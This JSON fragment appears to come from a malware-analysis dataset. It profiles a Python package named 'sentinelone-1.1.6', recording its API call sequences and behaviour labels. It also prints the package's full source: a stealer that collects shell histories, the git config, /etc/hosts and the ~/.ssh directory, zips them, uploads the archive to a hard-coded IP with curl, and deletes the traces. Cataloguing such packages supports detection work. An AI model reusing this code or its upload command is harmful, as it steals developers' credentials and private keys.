        "zipfile.ZipFile.write",
        "zipfile.ZipFile.close",
        "pwd.getpwuid",
        "os.getuid",
        "os.path.exists",
        "shutil.rmtree",
        "os.makedirs",
        "open",
        "file.write",
        "open",
        "pwd.getpwuid",
        "os.getuid",
        "file.write",
        "pwd.getpwuid",
        "os.getuid",
        "file.write",
        "subprocess.Popen",
        "subprocess.Popen.poll",
        "subprocess.Popen.wait",
        "subprocess.Popen.stdout.readlines",
        "bytes.decode",
        "file.write",
        "pwd.getpwuid",
        "os.getuid",
        "subprocess.Popen",
        "subprocess.Popen.poll",
        "subprocess.Popen.wait",
        "subprocess.Popen.stdout.readlines",
        "bytes.decode",
        "os.path.exists",
        "shutil.copyfile",
        "os.path.exists",
        "shutil.copyfile",
        "os.path.exists",
        "shutil.copyfile",
        "os.path.exists",
        "shutil.copyfile",
        "os.path.exists",
        "shutil.copytree",
        "os.path.exists",
        "shutil.copyfile",
        "zipfile.ZipFile",
        "os.walk",
        "os.path.join",
        "zipfile.ZipFile.write",
        "zipfile.ZipFile.close",
        "shutil.rmtree",
        "os.system",
        "os.remove"
      ],
      "api_sequence_with_args": [
        "open('/etc/hosts', 'r')",
        "pwd.getpwuid(os.getuid())",
        "os.getuid()",
        "subprocess.Popen(statement, shell=True, stdout=subprocess.PIPE)",
        "subprocess.Popen.poll()",
        "subprocess.Popen.wait()",
        "subprocess.Popen.stdout.readlines()",
        "bytes.decode('utf-8')",
        "zipfile.ZipFile(file_news, 'w', zipfile.ZIP_DEFLATED)",
        "os.walk(start_dir)",
        "os.path.join(dir_path, filename)",
        "zipfile.ZipFile.write(os.path.join(dir_path, filename), f_path + filename)",
        "zipfile.ZipFile.close()",
        "pwd.getpwuid(os.getuid())",
        "os.getuid()",
        "os.path.exists(foldername)",
        "shutil.rmtree(foldername)",
        "os.makedirs(foldername)",
        "open(filename, 'a+')",
        "file.write('hosts : [{}]'.format(get_hosts()) + '\\n')",
        "open(filename, 'a+')",
        "pwd.getpwuid(os.getuid())",
        "os.getuid()",
        "file.write('username : ' + get_username() + '\\n')",
        "pwd.getpwuid(os.getuid())",
        "os.getuid()",
        "file.write('test : [{}]'.format(subprocess_popen(\"bash -c ls /\")) +'\\n')",
        "subprocess.Popen(statement, shell=True, stdout=subprocess.PIPE)",
        "subprocess.Popen.poll()",
        "subprocess.Popen.wait()",
        "subprocess.Popen.stdout.readlines()",
        "bytes.decode('utf-8')",
        "file.write('test : [{}]'.format(subprocess_popen(\"bash -c ls /\")) +'\\n')",
        "pwd.getpwuid(os.getuid())",
        "os.getuid()",
        "subprocess.Popen(\"hostname\", shell=True, stdout=subprocess.PIPE)",
        "subprocess.Popen.poll()",
        "subprocess.Popen.wait()",
        "subprocess.Popen.stdout.readlines()",
        "bytes.decode('utf-8')",
        "os.path.exists(bashHistory)",
        "shutil.copyfile(bashHistory, foldername + '/bashHistory')",
        "os.path.exists(zshHistory)",
        "shutil.copyfile(zshHistory, foldername + '/zsh_history')",
        "os.path.exists(gitConfig)",
        "shutil.copyfile(gitConfig, foldername + '/gitConfig')",
        "os.path.exists(hosts)",
        "shutil.copyfile(hosts, foldername + '/hosts')",
        "os.path.exists(ssh)",
        "shutil.copytree(ssh, foldername + '/ssh')",
        "os.path.exists(zhHistory)",
        "shutil.copyfile(zhHistory, foldername + '/zhHistory')",
        "zipfile.ZipFile(file_news, 'w', zipfile.ZIP_DEFLATED)",
        "os.walk(start_dir)",
        "os.path.join(dir_path, filename)",
        "zipfile.ZipFile.write(os.path.join(dir_path, filename), f_path + filename)",
        "zipfile.ZipFile.close()",
        "shutil.rmtree(foldername)",
        "os.system(command)",
        "os.remove(zipname)"
      ],
      "mapped_sequence": [
        {
          "api_name": "open",
          "id": "basic_read_operations",
          "description": "ic file opening operations for reading (normal reading, binary reading)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "pwd.getpwuid",
          "id": "get_username",
          "description": "Retrieves current user's login name",
          "first_id": "information_gathering",
          "second_id": "system_information_collection",
          "third_id": "user_information"
        },
        {
          "api_name": "os.getuid",
          "id": "get_username",
          "description": "Retrieves current user's login name",
          "first_id": "information_gathering",
          "second_id": "system_information_collection",
          "third_id": "user_information"
        },
        {
          "api_name": "subprocess.Popen",
          "id": "spawn_process_shell",
          "description": "Spawns new process to execute command with shell access",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_reception"
        },
        {
          "api_name": "subprocess.Popen.poll",
          "id": "check_process_terminated",
          "description": "Checks if process has terminated",
          "first_id": "system_operations",
          "second_id": "process_management",
          "third_id": "process_control"
        },
        {
          "api_name": "subprocess.Popen.wait",
          "id": "wait_process_completion",
          "description": "Waits for process to complete execution",
          "first_id": "system_operations",
          "second_id": "process_management",
          "third_id": "process_control"
        },
        {
          "api_name": "subprocess.Popen.stdout.readlines",
          "id": "read_process_stdout",
          "description": "Reads all bytes from process standard output",
          "first_id": "system_operations",
          "second_id": "process_management",
          "third_id": "process_information"
        },
        {
          "api_name": "bytes.decode",
          "id": "decode_bytes_codec",
          "description": "Decodes bytes using specified codec",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "byte_encoding"
        },
        {
          "api_name": "zipfile.ZipFile",
          "id": "create_zip_archive",
          "description": "Creates new ZIP archive for writing",
          "first_id": "file_operations",
          "second_id": "compression_archiving",
          "third_id": "zip_operations"
        },
        {
          "api_name": "os.walk",
          "id": "list_files_directories",
          "description": "Lists files and directories in specified path",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "directory_operations"
        },
        {
          "api_name": "os.path.join",
          "id": "path_string_operations",
          "description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_path_operations"
        },
        {
          "api_name": "zipfile.ZipFile.write",
          "id": "add_file_zip",
          "description": "Adds file to ZIP archive with specified archive name",
          "first_id": "file_operations",
          "second_id": "compression_archiving",
          "third_id": "zip_operations"
        },
        {
          "api_name": "zipfile.ZipFile.close",
          "id": "close_file",
          "description": "Closes the opened file",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_closing"
        },
        {
          "api_name": "os.path.exists",
          "id": "check_path_exists",
          "description": "Checks if specified path exists in filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_checking"
        },
        {
          "api_name": "shutil.rmtree",
          "id": "delete_directory",
          "description": "Recursively deletes directory and its contents",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "directory_operations"
        },
        {
          "api_name": "os.makedirs",
          "id": "create_directory",
          "description": "Creates directory, ignoring if it already exists",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "directory_operations"
        },
        {
          "api_name": "open",
          "id": "combined_mode_operations",
          "description": "Combined mode file opening operations (read-write mode, append mode, etc.)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "file.write",
          "id": "basic_file_writing",
          "description": "Writing data to files (strings or bytes)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_writing"
        },
        {
          "api_name": "shutil.copyfile",
          "id": "copy_file",
          "description": "Copies file to destination, preserving metadata",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_transfer"
        },
        {
          "api_name": "shutil.copytree",
          "id": "copy_file",
          "description": "Copies file to destination, preserving metadata",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_transfer"
        },
        {
          "api_name": "os.system",
          "id": "execute_shell_command",
          "description": "Executes shell command",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_sending"
        },
        {
          "api_name": "os.remove",
          "id": "delete_file",
          "description": "Deletes specified file from filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_transfer"
        }
      ],
      "contextual_code": "import os\nimport pwd\nimport shutil\nimport zipfile\nimport subprocess\n\ndef get_hosts():\n    with open('/etc/hosts', 'r') as f:\n        return (f.read())\n\ndef get_username():\n    return pwd.getpwuid(os.getuid())[0]\n\ndef subprocess_popen(statement):\n    p = subprocess.Popen(statement, shell=True, stdout=subprocess.PIPE)\n    while p.poll() is None:\n        if p.wait() is not 0:\n            return False\n        else:\n            re = p.stdout.readlines()\n            result = []\n            for i in range(len(re)):\n                res = re[i].decode('utf-8').strip('\\r\\n')\n                result.append(res)\n            return result\n\ndef zip_ya(start_dir):\n    file_news = start_dir + '.zip'\n    z = zipfile.ZipFile(file_news, 'w', zipfile.ZIP_DEFLATED)\n    for dir_path, dir_names, file_names in os.walk(start_dir):\n        f_path = dir_path.replace(start_dir, '')\n        f_path = f_path and f_path + os.sep or ''\n        for filename in file_names:\n            z.write(os.path.join(dir_path, filename), f_path + filename)\n    z.close()\n    return file_news\n\ndef writeFile(serialId='default'):\n    username = get_username()\n    foldername = '/Users/' + username + '/Library/Logs/tmp'\n    zipname = '/Users/' + username + '/Library/Logs/tmp.zip'\n    filename = '/Users/' + username + '/Library/Logs/tmp/tmp.txt'\n    if os.path.exists(foldername):\n        shutil.rmtree(foldername)\n    os.makedirs(foldername)\n    with open(filename, 'a+') as file:\n        file.write('hosts : [{}]'.format(get_hosts()) + '\\n')\n        file.write('username : ' + get_username() + '\\n')\n        file.write('test : [{}]'.format(subprocess_popen(\"bash -c ls /\")) +'\\n')\n    bashHistory = '/Users/' + username + '/.bash_history'\n    zshHistory = '/Users/' + username + '/.zsh_history'\n    gitConfig = '/Users/' + username + '/.gitConfig'\n    hosts = '/etc/hosts'\n    ssh = '/Users/' + username + '/.ssh'\n    zhHistory = '/Users/' + username + '/.zhHistory'\n    serialId = str(subprocess_popen(\"hostname\"))\n    if os.path.exists(bashHistory):\n        shutil.copyfile(bashHistory, foldername + '/bashHistory')\n    if os.path.exists(zshHistory):\n        shutil.copyfile(zshHistory, foldername + '/zsh_history')\n    if os.path.exists(gitConfig):\n        shutil.copyfile(gitConfig, foldername + '/gitConfig')\n    if os.path.exists(hosts):\n        shutil.copyfile(hosts, foldername + '/hosts')\n    if os.path.exists(ssh):\n        shutil.copytree(ssh, foldername + '/ssh')\n    if os.path.exists(zhHistory):\n        shutil.copyfile(zhHistory, foldername + '/zhHistory')\n    zip_ya(foldername)\n    shutil.rmtree(foldername)\n    command = \"curl -k -F \\\"file=@\" + zipname + \"\\\" \\\"https://54.254.189.27/api/v1/file/upload\\\" > /dev/null 2>&1\"\n    os.system(command)\n    os.remove(zipname)"
    }
  },
  {
    "metadata": {
      "package_name": "sentinelone-1.1.6"
    }
  }
]